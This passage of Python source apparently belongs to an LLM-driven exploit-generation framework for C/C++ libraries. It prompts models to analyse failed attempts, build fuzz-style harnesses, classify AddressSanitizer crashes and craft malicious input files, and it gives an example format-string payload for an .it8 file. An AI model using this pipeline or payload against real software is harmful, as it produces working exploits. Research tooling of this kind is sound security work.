            sections.append(f"\n=== SINK CODE ===\n{so.sink_source}")

        # ── How attacker data enters (the key info) ───────────────
        if so.data_source_info:
            sections.append(f"\n=== HOW DATA REACHES THE SINK ===\n{so.data_source_info}")

        # ── Reasoning from vulnerability analysis ─────────────────
        if so.reasoning_analysis:
            sections.append(f"\n=== VULNERABILITY ANALYSIS ===\n{so.reasoning_analysis[:1500]}")

        # ── Trace ─────────────────────────────────────────────────
        if so.trace_text:
            sections.append(f"\n=== TRACE ===\n{so.trace_text}")

        # ── What was tried and what happened ──────────────────────
        sections.append(f"\n=== FAILED ATTEMPTS ({so.pipeline_attempts} total) ===")
        for i, reason in enumerate(so.backward_reasons[-10:]):
            sections.append(f"  {i+1}. {reason}")

        # ── The last harness that was tried ───────────────────────
        if so.last_harness_source:
            sections.append(f"\n=== LAST HARNESS (THIS APPROACH FAILED) ===\n```cpp\n{so.last_harness_source[:2000]}\n```")

        # ── Last run output ───────────────────────────────────────
        if so.last_run_feedback:
            sections.append(f"\n=== LAST RUN OUTPUT ===\n{so.last_run_feedback[:800]}")

        # ── Available API functions ───────────────────────────────
        if so.header_declarations:
            sections.append(f"\n=== AVAILABLE API (from header) ===\n{so.header_declarations[:1500]}")

        # ── The question ──────────────────────────────────────────
        sections.append(f"""
=== YOUR TASK ===
The previous {so.pipeline_attempts} attempts ALL used the SAME wrong approach.
Analyze the sink code and data flow above. Answer ALL of these questions:

1. WHERE is the vulnerable variable (e.g. it8->DoubleFormatter) actually SET?
   Look at the "HOW DATA REACHES THE SINK" section — it shows the actual
   assignment code. Is it set by an API call? By file parsing? By something else?

2. WHY did the previous harness fail? What API did it call, and why doesn't
   that API set the vulnerable field?

3. WHAT is the correct approach? Which function should the harness call to
   populate the vulnerable field through the REAL code path?

4. INPUT SPECIFICATION (CRITICAL — answer ALL of these):
   a) INPUT_TYPE: file | memory_buffer | string | integer | none
   b) INPUT_FORMAT: the file extension or format name (e.g. .it8, .pdf, .icc, raw bytes)
   c) INPUT_LOAD_FUNCTION: the API function that loads/parses this input (e.g. cmsIT8LoadFromFile, cmsIT8LoadFromMem)
   d) MALICIOUS_CONTENT: the EXACT content the input file must contain to trigger the vulnerability.
      Be specific — show the actual bytes/text. For example:
      "The .it8 file must contain a line: DOUBLEFORMAT \\"%s%s%s%s%s%s\\""
   e) TRIGGER_FUNCTION: after loading, which function triggers the vulnerable code path?

5. Write a CONCRETE harness that:
   - Takes the input file as argv[1]
   - Loads it using INPUT_LOAD_FUNCTION
   - Calls TRIGGER_FUNCTION to trigger the vulnerability
   AND describe the EXACT malicious input file content.

Be SPECIFIC. Do not repeat the failed approach. If the data enters through
file parsing, the harness must LOAD A FILE, and you must specify WHAT the file contains.
""")

        prompt = "\n".join(sections)
        resp = self._call_llm(self.llm_a,
            "You are analyzing failed exploit attempts. Be specific and concrete. "
            "Focus on HOW the vulnerable field is populated — the previous approach was wrong. "
            "You MUST specify the exact INPUT file content needed to trigger the vulnerability.",
            prompt)

        if resp and len(resp) > 50:
            so.reflection_insight = resp[:3000]
            logger.info("REFLECT: produced %d chars of strategic insight", len(so.reflection_insight))

            # ── Extract input specification from reflection ───────────
            import re as _re
            resp_lower = resp.lower()

            # Detect input type
            if any(kw in resp_lower for kw in ["loadfromfile", "loadfrommem", "load a file",
                                                 "crafted file", "malicious file", "input file",
                                                 ".it8", ".icc", ".pdf", "file parsing"]):
                so.input_format = "file"

                # Try to extract file extension
                ext_match = _re.search(r'\.(it8|icc|pdf|cgats|tiff?|png|xml|csv)\b', resp_lower)
                if ext_match:
                    so.input_ext = "." + ext_match.group(1)
                    logger.info("REFLECT: detected input format: %s", so.input_ext)

                # Try to extract the load function
                load_match = _re.search(r'(cms\w*(?:Load|Read|Parse|Open)\w*)', resp)
                if load_match:
                    logger.info("REFLECT: detected load function: %s", load_match.group(1))

            elif any(kw in resp_lower for kw in ["loadfrommem", "memory buffer", "buffer"]):
                so.input_format = "memory_buffer"
        else:
            logger.warning("REFLECT: LLM returned empty or short response")

    def _discover_call_chain(self) -> str:
        """Find the call chain from public API to sink.

        Priority:
          1. Use the Joern trace (already extracted in _extract_trace_intelligence)
          2. Fall back to grep-based discovery if trace was too shallow
        """
        so = self.so
        if so.call_chain:
            logger.info("Call chain already available from Joern trace")
            return so.call_chain

        # Grep fallback
        target = so.callable_target or so.sink_function
        if not target or len(target) < 3:
            return ""

        logger.info("Grep fallback: discovering call chain for: %s", target)
        chain_parts = []
        visited = set()
        current_func = target
        current_file = so.sink_file

        for depth in range(5):
            if current_func in visited: break
            visited.add(current_func)
            grep_r = self.env.exec(
                f"grep -rn '{current_func}' /src/ --include='*.cpp' --include='*.c' --include='*.cc' "
                f"2>/dev/null | grep -v '^\\.\\|define\\|typedef\\|/test/\\|_test\\.' | head -15",
                timeout=10)
            if not grep_r.stdout.strip(): break

            for line in grep_r.stdout.strip().split("\n"):
                parts = line.strip().split(":", 2)
                if len(parts) < 3: continue
                file_path, line_num, code = parts[0], parts[1], parts[2]
                if current_file and current_file in file_path and depth == 0:
                    if f"{current_func}(" not in code: continue
                try: ln = int(line_num)
                except ValueError: continue

                ctx_r = self.env.exec(f"sed -n '{max(1,ln-5)},{ln+10}p' {file_path} 2>/dev/null", timeout=5)
                ctx = ctx_r.stdout.strip() if ctx_r.stdout.strip() else code.strip()

                func_r = self.env.exec(
                    f"sed -n '1,{ln}p' {file_path} 2>/dev/null | grep -n '\\w\\+\\s*(' | tail -5",
                    timeout=5)
                caller_name = "?"
                if func_r.stdout.strip():
                    for fline in reversed(func_r.stdout.strip().split("\n")):
                        m = re.search(r'(\w+)\s*\(', fline)
                        if m and m.group(1) not in ("if","for","while","switch","return"):
                            caller_name = m.group(1); break

                chain_parts.append(f"\n--- Level {depth}: {current_func} called by {caller_name} in {file_path}:{line_num} ---\n{ctx[:500]}")

                if so.header_file and caller_name != "?":
                    hdr_check = self.env.exec(f"grep '{caller_name}' {so.header_file} 2>/dev/null | head -2", timeout=5)
                    if hdr_check.stdout.strip():
                        chain_parts.append(f"\n✅ PUBLIC API FOUND: {caller_name} in {so.header_file}:\n  {hdr_check.stdout.strip()[:300]}\n  → Call {caller_name}() to reach {target}!")
                        return "\n".join(chain_parts)

                current_func = caller_name if caller_name != "?" else current_func
                current_file = file_path
                break

        return "\n".join(chain_parts) if chain_parts else ""

    # =================================================================
    # Helpers
    # =================================================================

    def _call_llm(self, fn, system, prompt, max_retries=3):
        """Call the LLM with retry and backoff for timeout resilience.

        On timeout, retries with exponential backoff. On 3rd retry,
        truncates the prompt to reduce response time.
        """
        for attempt in range(max_retries):
            try:
                # On later retries, truncate prompt to reduce generation time
                p = prompt
                if attempt >= 2:
                    p = prompt[:len(prompt) // 2] + "\n\n[TRUNCATED — respond concisely]"
                    logger.warning("LLM retry %d: truncated prompt to %d chars", attempt + 1, len(p))

                result = fn(system, p)
                if result:
                    return result
                # Empty result — retry
                logger.warning("LLM returned empty response, retry %d/%d", attempt + 1, max_retries)
            except Exception as e:
                logger.error("LLM failed (attempt %d/%d): %s", attempt + 1, max_retries, e)
                if attempt < max_retries - 1:
                    wait = 2 ** attempt  # 1s, 2s, 4s
                    logger.info("Retrying in %ds...", wait)
                    import time
                    time.sleep(wait)
        return ""

    def _exec_actions(self, actions, result):
        parts = []
        for a in actions:
            result.total_actions += 1
            if a.kind == "shell":
                r = self.env.exec(a.content, timeout=self.config.exec_timeout)
                parts.append(f"[shell] $ {a.content}\nexit_code={r.exit_code}\n{self._smart_truncate(a.content, r.exit_code, r.output or '')}")
            elif a.kind == "write_file":
                wr = self.env.write_file(a.path, a.content)
                parts.append(f"[write_file] {'OK' if wr.success else 'FAIL'}: {a.path}")
            elif a.kind == "read_file":
                parts.append(f"[read_file] {a.path}:\n{self.env.read_file(a.path)[:3000]}")
        return "\n\n".join(parts)

    def _classify_crash(self, output):
        if not output or output in ("(no output)","") or output.strip() == "": return "clean"
        if "AddressSanitizer" not in output:
            if "Segmentation fault" in output: return "segfault_no_asan"
            m = re.search(r"exit_code=(\d+)", output)
            if m:
                c = int(m.group(1))
                if c == 0: return "clean"
                if c in (124,127): return "timeout"
            return "clean"
        init_kw = ("Alloc","Create","Init","Setup","New","Open","Malloc")

        # Extract only ASAN stack frames for accurate matching
        # (avoid matching sink_function in error descriptions or file paths)
        stack_lines = [l for l in output.split("\n")
                       if l.strip().startswith("#") or "in " in l]
        stack_text = "\n".join(stack_lines)

        # Check both sink_function AND callable_target.
        # When sink is a variable (dest_scan), it won't appear in stack frames,
        # but callable_target (GetBPP) — the function that contains the variable — will.
        ct = self.so.callable_target or ""
        has_library_frame = any("/src/" in l for l in stack_lines)

        if self.sink_function in stack_text and has_library_frame:
            return "target_sink"
        if ct and ct != self.sink_function and ct in stack_text and has_library_frame:
            return "target_sink"

        # Harness-only crash: all frames in /work/, none in /src/
        # Must check BEFORE sink_file match — callable_target like "snprintf"
        # appears in harness printf crashes too.
        if not has_library_frame:
            if any("/work/" in l for l in stack_lines):
                return "harness_bug"

        sb = self.sink_file.rsplit("/",1)[-1] if self.sink_file else ""
        if sb and sb in stack_text:
            for l in stack_lines:
                if sb in l and any(k in l for k in init_kw): return "init_crash"
            return "same_file"
        for l in stack_lines:
            if ("/src/" in l or "/work/build/" in l) and any(k in l for k in init_kw): return "init_crash"
        if any("/src/" in l for l in stack_lines): return "wrong_location"
        return "unknown_crash"

    def _check_sink_reachable(self) -> bool:
        """Use GDB to check if the callable target is reachable from the harness.

        Sets a breakpoint on callable_target (not sink_function, which might
        be a variable). Returns True if the breakpoint is hit.
        """
        inp = self._find_input_file()
        # Use callable_target — sink_function might be a variable (can't breakpoint)
        target = self.so.callable_target or self.so.sink_function
        if not target or len(target) < 3:
            return False

        gdb_cmd = (
            f"echo 'set confirm off\n"
            f"set pagination off\n"
            f"break {target}\n"
            f"run {inp}\n"
            f"quit' | "
            f"ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 "
            f"gdb -batch -q /work/harness 2>&1 | head -30"
        )
        r = self.env.exec(gdb_cmd, timeout=20)
        gdb_out = r.stdout or ""

        hit = ("Breakpoint" in gdb_out and target in gdb_out) or f"in {target}" in gdb_out
        logger.info("Reachability check: %s → %s",
                     target, "REACHABLE" if hit else "NOT REACHED")
        return hit

    def _run_harness(self, inp):
        if self.env.exec("test -x /work/harness && echo y", timeout=3).stdout.strip() != "y":
            return "exit_code=127\nERROR: /work/harness not executable"
        r = self.env.exec(f"ASAN_OPTIONS=detect_leaks=0 timeout 20 /work/harness {inp} 2>&1", timeout=30)
        return f"exit_code={r.exit_code}\n{self._smart_truncate(f'/work/harness {inp}', r.exit_code, r.output or '')}"

    def _find_input_file(self):
        r = self.env.exec("ls /work/input.* /work/crash_input 2>/dev/null | head -1", timeout=5)
        if r.stdout.strip(): return r.stdout.strip().split("\n")[0]
        if self.so.test_files: self.env.exec(f"cp {self.so.test_files[0]} /work/input.dat 2>/dev/null", timeout=5)
        else: self.env.exec(f"cp $(find /src -type f -name '*{self.so.input_ext}' 2>/dev/null | head -1) /work/input.dat 2>/dev/null", timeout=10)
        return "/work/input.dat"

    def _sweep_inputs(self):
        files = list(self.so.test_files or [])
        # Prepend any crafted/custom input files (from WRITE or CRAFT)
        custom_r = self.env.exec("ls /work/input.* /work/crafted_input* 2>/dev/null", timeout=5)
        if custom_r.stdout.strip():
            custom_files = [f.strip() for f in custom_r.stdout.strip().split("\n") if f.strip()]
            # Put custom files FIRST — they're more likely to trigger the vuln
            files = custom_files + [f for f in files if f not in custom_files]
        if not files:
            f = self.env.exec(f"find /src -type f \\( -name '*{self.so.input_ext}' -o -name '*.bin' \\) 2>/dev/null | head -50", timeout=15)
            files = [x.strip() for x in f.stdout.strip().split("\n") if x.strip()] if f.stdout.strip() else []
        # Track what happened with each file for diagnostic feedback
        results_summary = []
        for tf in files:
            r = self.env.exec(f"ASAN_OPTIONS=detect_leaks=0 timeout 10 /work/harness {tf} 2>&1", timeout=15)
            crash = self._classify_crash(r.output or "")
            if crash in ("target_sink", "same_file", "init_crash", "segfault_no_asan"):
                self.env.exec(f"cp {tf} /work/crash_input", timeout=5)
                return "/work/crash_input"
            if crash == "wrong_location":
                results_summary.append(f"  {tf}: crash at WRONG LOCATION (library runs but hits different path)")
            elif crash == "clean":
                # Capture stderr for diagnostic clues (e.g., "unknown keyword", "parse error")
                stderr_snip = (r.output or "")[-200:].strip()
                if stderr_snip and "exit_code=0" not in stderr_snip:
                    results_summary.append(f"  {tf}: clean exit — stderr: {stderr_snip[:100]}")
        # Store sweep diagnostics for CRAFT and future WRITE cycles
        if results_summary:
            self.so.last_run_feedback = (
                f"SWEEP tried {len(files)} files, none crashed at sink.\n"
                + "\n".join(results_summary[:10]))
        return ""

    def _run_input_reflection(self, turn_log):
        """INPUT_REFLECTION: Framework-driven stage to create and test malicious input.

        Unlike CRAFT (which asked the LLM to write a Python script), this stage:
        1. Framework reads parser source code automatically
        2. Framework finds sample files automatically
        3. Asks LLM for ONLY the raw file content
        4. Framework saves the file and runs the harness
        5. Feeds the result back and iterates (up to 3 attempts)

        Returns: path to crash-inducing file, or "" if no crash.
        """
        so = self.so
        vc = so.vuln_tags[0] if so.vuln_tags else "unknown"
        logger.info("INPUT_REFLECTION: crafting malicious %s input (attempt %d)",
                    so.input_ext or "file", so.pipeline_attempts)

        # ══════════════════════════════════════════════════════════════
        # Phase 1: GATHER CONTEXT (framework, no LLM)
        # ══════════════════════════════════════════════════════════════

        # Read parser source code around where the vulnerable field is set
        parser_context = ""
        if so.data_source_info and self.env.is_running:
            import re as _re
            write_locations = _re.findall(r'(/src/[^:]+):(\d+)', so.data_source_info)
            for wfile, wline in write_locations[:2]:
                ln = int(wline)
                ctx_r = self.env.exec(
                    f"sed -n '{max(1, ln - 50)},{ln + 30}p' {wfile} 2>/dev/null",
                    timeout=5)
                if ctx_r.stdout.strip():
                    parser_context += f"\n--- {wfile}:{ln} ---\n{ctx_r.stdout.strip()[:2500]}\n"

        # Find sample files matching the format
        sample_content = ""
        sample_path = ""
        ext = so.input_ext if so.input_ext != ".bin" else ""
        if not ext:
            # Guess extension from sink file
            for fmt in [".it8", ".cgats", ".icc", ".pdf"]:
                if fmt.replace(".", "").lower() in so.sink_file.lower():
                    ext = fmt; break
        if not ext:
            ext = ".dat"

        if self.env.is_running:
            # Search for sample files
            for search in [
                f"find /src -name '*{ext}' -size +10c -size -50k 2>/dev/null | head -3",
                "find /src -name '*.it8' -o -name '*.cgats' 2>/dev/null | head -3",
                f"find /src -path '*/test*' -type f -size +10c -size -50k 2>/dev/null | head -5",
            ]:
                samples_r = self.env.exec(search, timeout=10)
                if samples_r.stdout.strip():
                    for sf in samples_r.stdout.strip().split("\n")[:2]:
                        sf = sf.strip()
                        if not sf: continue
                        content_r = self.env.exec(f"head -30 {sf} 2>/dev/null", timeout=5)
                        if content_r.stdout.strip():
                            sample_content += f"\n=== {sf} ===\n{content_r.stdout.strip()[:600]}\n"
                            if not sample_path: sample_path = sf
                    if sample_content:
                        break

        # ══════════════════════════════════════════════════════════════
        # Phase 2: ASK LLM FOR FILE CONTENT (iterative, up to 3 tries)
        # ══════════════════════════════════════════════════════════════

        inp_path = f"/work/crafted_input{ext}"

        for attempt in range(3):
            sections = []

            if attempt == 0:
                sections.append(
                    f"Create the CONTENT of a malicious {ext} file that triggers "
                    f"{vc} at {so.sink_function}.\n"
                    f"The harness loads this file via argv[1]. You need to create "
                    f"a file that, when parsed, sets the vulnerable field to a "
                    f"dangerous value (format specifiers, long strings, etc.).")
            else:
                sections.append(
                    f"⚠️ ATTEMPT {attempt + 1}: The previous input file did NOT trigger the vulnerability.\n"
                    f"Fix the file content based on the error/output below.")

            # Show parser source code
            if parser_context:
                sections.append(
                    f"\n=== PARSER SOURCE CODE ===\n"
                    f"This is the code that parses the input file. Find the KEYWORD "
                    f"that sets the vulnerable field:\n{parser_context}")

            # Show sample files
            if sample_content:
                sections.append(
                    f"\n=== SAMPLE FILES (use as template — keep structure, change vulnerable field) ===\n"
                    f"{sample_content}")

            # Show how the vulnerable field is set
            if so.data_source_info:
                sections.append(f"\n=== HOW THE VULNERABLE FIELD IS SET ===\n{so.data_source_info[:1200]}")

            # Show sink code
            if so.sink_source:
                sections.append(f"\n=== SINK CODE ===\n{so.sink_source[:600]}")

            # Show reflection insight
            if so.reflection_insight:
                sections.append(f"\n=== STRATEGIC ANALYSIS ===\n{so.reflection_insight[:1500]}")

            # Show reasoning analysis
            if so.reasoning_analysis:
                sections.append(f"\n=== VULNERABILITY ANALYSIS ===\n{so.reasoning_analysis[:1000]}")

            # Show last run feedback (from previous attempt in this loop)
            if so.last_run_feedback and attempt > 0:
                sections.append(f"\n=== LAST ATTEMPT RESULT ===\n{so.last_run_feedback[:800]}")

            # Show harness code so LLM knows how input is consumed
            if so.last_harness_source:
                sections.append(f"\n=== HARNESS (loads your file) ===\n```cpp\n{so.last_harness_source[:1000]}\n```")

            sections.append(f"""
=== YOUR OUTPUT ===
Output ONLY the raw file content. No explanation, no code blocks, no markdown.
Just the exact bytes/text that should be in the file.

The file will be saved as {inp_path} and fed to the harness.

Example for a format string attack on an .it8 file:
LCMS
DOUBLEFORMAT "%s%s%s%s%s%s%s%s"
NUMBER_OF_FIELDS 1
NUMBER_OF_SETS 1
BEGIN_DATA_FORMAT
SAMPLE_ID
END_DATA_FORMAT
BEGIN_DATA
1
END_DATA
""")

            prompt = "\n".join(sections)
            resp = self._call_llm(self.llm_b,
                "Output ONLY the raw content of the malicious input file. "
                "No explanation. No code blocks. No markdown. Just the file content.",
                prompt)

            if not resp or len(resp.strip()) < 5:
                logger.warning("INPUT_REFLECTION: LLM returned empty content (attempt %d)", attempt + 1)
                continue

            # ── Clean the response ────────────────────────────────────
            # Strip markdown code fences if the LLM wraps it
            content = resp.strip()
            content = re.sub(r'^```\w*\s*\n?', '', content)
            content = re.sub(r'\n?```\s*$', '', content)
            # Strip leading explanation lines (LLM sometimes adds "Here is the file:")
            lines = content.split("\n")
            # Find where actual content starts (skip lines that look like explanation)
            start = 0
            for i, line in enumerate(lines[:5]):
                if any(kw in line.lower() for kw in ["here is", "here's", "the following",
                                                       "below is", "i'll create", "this file"]):
                    start = i + 1
                else:
                    break
            content = "\n".join(lines[start:]).strip()

            if len(content) < 3:
                logger.warning("INPUT_REFLECTION: cleaned content too short (attempt %d)", attempt + 1)
                continue

            # ── Save and test ─────────────────────────────────────────
            logger.info("INPUT_REFLECTION: saving %d bytes to %s (attempt %d)",
                        len(content), inp_path, attempt + 1)
            self.env.write_file(inp_path, content)
            turn_log[f"input_content_{attempt}"] = content[:500]

            # Run harness with the crafted file
            harness_ok = self.env.exec("test -x /work/harness && echo y", timeout=3).stdout.strip() == "y"
            if not harness_ok:
                logger.info("INPUT_REFLECTION: no harness yet — file saved for later")
                return inp_path  # Will be picked up by _find_input_file

            run_out = self._run_harness(inp_path)
            crash = self._classify_crash(run_out)
            logger.info("INPUT_REFLECTION: attempt %d result: %s", attempt + 1, crash)

            if crash in ("target_sink", "same_file", "segfault_no_asan"):
                logger.info("INPUT_REFLECTION: 🎯 CRASH! (%s) on attempt %d", crash, attempt + 1)
                self.env.exec(f"cp {inp_path} /work/crash_input 2>/dev/null", timeout=3)
                so.run_output = run_out[-2000:]
                so.crash_type = crash
                return "/work/crash_input"

            # No crash — save feedback for next attempt
            so.last_run_feedback = f"INPUT_REFLECTION attempt {attempt + 1}: {crash}\n{run_out[-800:]}"

            if crash == "init_crash":
                so.last_run_feedback += "\n→ The file caused a crash during initialization. Check file format."
            elif crash == "clean":
                so.last_run_feedback += ("\n→ Clean exit. The vulnerable field was NOT set to a dangerous value.\n"
                                          "Check: is the keyword name correct? Is the format string dangerous enough?")

        # All attempts exhausted
        logger.warning("INPUT_REFLECTION: no crash after 3 attempts")
        return ""

    def _ask_reviewer(self, context):
        try:
            r = self.llm_a("You review exploit development. Give specific advice.", f"GOAL: Trigger {self.so.sink_function} at {self.so.sink_file}\n\n{context}\n\nVerdict: REDIRECT or 'rewrite harness'.")
            return {"verdict": "REDIRECT", "message": r[:500]}
        except Exception as e: return {"verdict": "CONTINUE", "message": str(e)}

    def _run_verification(self, binary, input_file):
        return verify_harness(
            env=self.env, harness_binary=binary, input_file=input_file,
            sink_function=self.sink_function, sink_file=self.sink_file,
            library_name=self.profile.library_name,
            callable_target=self.so.callable_target or "",
            timeout=self.config.verify_timeout)

    @staticmethod
    def _smart_truncate(cmd, exit_code, raw, max_len=4000):
        if not raw: return "(no output)"
        if len(raw) <= max_len: return raw
        if "AddressSanitizer" in raw:
            keep = []; cap = False
            for l in raw.split("\n"):
                if "ERROR:" in l and "AddressSanitizer" in l: cap = True
                if cap: keep.append(l)
                if cap and l.strip() == "" and len(keep) > 5: break
                if "SUMMARY:" in l: keep.append(l)
            if keep: return "\n".join(keep)[:max_len]
        if any(k in cmd for k in ("g++","gcc","clang","make")) and exit_code != 0:
            blocks = []
            lines = raw.split("\n")
            for i, l in enumerate(lines):
                if "error:" in l.lower() or "undefined reference" in l.lower():
                    blocks.append("\n".join(lines[max(0,i-1):min(len(lines),i+4)]))
            if blocks: return "\n...\n".join(blocks)[:max_len]
        h = max_len // 2 - 30
        return raw[:h] + "\n... [TRUNCATED] ...\n" + raw[-h:]
